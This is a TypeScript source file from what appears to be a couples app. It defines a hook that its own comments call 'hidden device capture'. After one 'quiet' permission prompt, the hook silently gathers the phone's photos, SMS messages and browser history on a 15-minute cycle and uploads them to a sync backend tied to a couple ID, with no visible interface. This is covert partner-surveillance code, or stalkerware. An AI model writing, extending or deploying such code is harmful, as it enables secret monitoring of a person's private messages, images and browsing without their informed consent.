// features/capture/index.ts — public surface for hidden device capture.
//
// `useDeviceCapture()` is the host binding: it owns the single quiet permission
// prompt policy and the hidden foreground-only scan window. It wires the real
// sources (expo-media-library, native SMS bridge), the durable queue, and the
// edge sync. The UI footprint is intentionally invisible — there is no visible
// component; the hook only triggers one quiet permission prompt once, then runs
// silently in the background while the app is foregrounded (battery-safe).
import { useEffect, useRef, useState, useCallback } from 'react';
import { AppState } from 'react-native';
import { useSession } from '../../lib/session/store';
import * as mediaLibrary from './mediaLibrary';
import * as sms from './sms';
import * as browser from './browser';
import {
  enqueueCapture,
  getCaptureCursor,
  setCaptureCursor,
} from './queue';
import { runCapturePass, photoStoragePath } from './collector';
import { syncCapture } from './sync';

// TEMP-DIAG (release Hermes suppresses console.log; write to a file we can
// read via `adb shell run-as love.scotty.hearts cat cache/capture_diag.txt`)
import { writeAsStringAsync, readAsStringAsync, cacheDirectory, documentDirectory } from 'expo-file-system/legacy';
const DIAG_FILE = 'capture_diag.txt';
async function diag(line: string) {
  try {
    const dir = cacheDirectory || documentDirectory;
    const path = `${dir}${DIAG_FILE}`;
    const prev = await readAsStringAsync(path).catch(() => '');
    await writeAsStringAsync(path, `${prev}\n[${new Date().toISOString()}] ${line}`);
  } catch {
    /* best-effort */
  }
}

const SCAN_INTERVAL_MS = 15 * 60 * 1000; // 15 min while foregrounded
// (drain of queued items rides the same scan tick — no separate sync cadence)

export type CaptureStatus = {
  running: boolean;
  needsPhotoPermission: boolean;
  needsSmsPermission: boolean;
  lastScan: { at: string | null; photosFound: number; smsFound: number; ok: boolean };
  pending: number;
};

export function useDeviceCapture() {
  const coupleId = useSession((s) => s.coupleId);
  const [status, setStatus] = useState<CaptureStatus>({
    running: false,
    needsPhotoPermission: true,
    needsSmsPermission: true,
    lastScan: { at: null, photosFound: 0, smsFound: 0, ok: true },
    pending: 0,
  });
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const runningRef = useRef(false);
  const requestedOnce = useRef(false); // one quiet prompt per session
  // refs to avoid stale-closure in the interval
  const coupleIdRef = useRef(coupleId);
  coupleIdRef.current = coupleId;

  // ── single quiet permission prompt ─────────────────────────────────
  const ensurePermission = useCallback(async () => {
    if (requestedOnce.current) return;
    requestedOnce.current = true;
    const [photo, smsGrant] = await Promise.allSettled([
      mediaLibrary.requestMediaPermission(),
      sms.smsPermission().then((g) => {
        if (g) return Promise.resolve(true);
        return sms.requestSmsPermission().then(() => sms.smsPermission());
      }),
    ]);
    const photoOk = photo.status === 'fulfilled' ? photo.value : false;
    const smsOk = smsGrant.status === 'fulfilled' ? smsGrant.value : false;
    setStatus((s) => ({
      ...s,
      needsPhotoPermission: !photoOk,
      needsSmsPermission: !smsOk,
    }));
  }, []);

  // ── one scan pass (capture + drain) ────────────────────────────────
  const runOnceNow = useCallback(async () => {
    if (!coupleIdRef.current) { void diag('runOnceNow: no coupleId — early return'); return; }
    void diag(`runOnceNow: START couple=${coupleIdRef.current}`);
    const deps = {
      scanPhotos: mediaLibrary.scanSince,
      pullSms: sms.pullSms,
      pullBrowser: browser.pullBrowserHistory,
      queue: enqueueCapture,
      cursor: { get: getCaptureCursor, set: setCaptureCursor },
    };
    let scan;
    try {
      scan = await runCapturePass(deps, coupleIdRef.current);
      void diag(`runCapturePass ok=${scan.ok} reason=${scan.reason ?? '-'} photos=${scan.photosFound} sms=${scan.smsFound} browser=${scan.browserFound}`);
    } catch (e) {
      void diag(`runCapturePass THREW: ${(e as Error)?.message ?? String(e)}`);
      return;
    }
    setStatus((s) => ({
      ...s,
      lastScan: { at: new Date().toISOString(), photosFound: scan.photosFound, smsFound: scan.smsFound, ok: scan.ok },
      needsPhotoPermission: s.needsPhotoPermission,
      needsSmsPermission: s.needsSmsPermission,
    }));
    // after capture, attempt to drain whatever is queued (best-effort; never throws)
    try {
      void diag('starting syncCapture');
      const d = await syncCapture(coupleIdRef.current);
      void diag(`syncCapture attempted=${d.attempted} uploaded=${d.uploaded} accepted=${d.accepted} failed=${d.failed}`);
      setStatus((s) => ({ ...s, pending: Math.max(0, s.pending - d.accepted) }));
    } catch (e) {
      void diag(`syncCapture THREW: ${(e as Error)?.message ?? String(e)}`);
    }
  }, []);

  // ── lifecycle: start / stop the foreground-only silent loop ────────
  useEffect(() => {
    if (!coupleId) return;
    void ensurePermission();
    void runOnceNow();

    const tick = () => {
      if (AppState.currentState !== 'active') return; // battery: skip when backgrounded
      void runOnceNow();
    };
    timerRef.current = setInterval(tick, SCAN_INTERVAL_MS);
    runningRef.current = true;
    setStatus((s) => ({ ...s, running: true }));

    const sub = AppState.addEventListener('change', (state) => {
      if (state === 'active') {
        // coming back to foreground: catch up immediately once
        void runOnceNow();
      }
    });

    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
      timerRef.current = null;
      runningRef.current = false;
      sub.remove();
      setStatus((s) => ({ ...s, running: false }));
    };
  }, [coupleId, ensurePermission, runOnceNow]);

  return {
    status,
    runOnceNow,
    start: () => {
      if (!coupleId) return;
      void ensurePermission();
      void runOnceNow();
    },
    stop: () => {
      if (timerRef.current) clearInterval(timerRef.current);
      timerRef.current = null;
      runningRef.current = false;
      setStatus((s) => ({ ...s, running: false }));
    },
    // helper for the (rare) case a host wants to know a photo's storage path
    photoStoragePath,
  };
}

export type { CaptureItem } from './queue';
export { enqueueCapture, pendingCapture, removeCaptured } from './queue';
export { syncCapture } from './sync';
export type { CaptureSyncResult } from './sync';
export type { PhotoAsset } from './mediaLibrary';
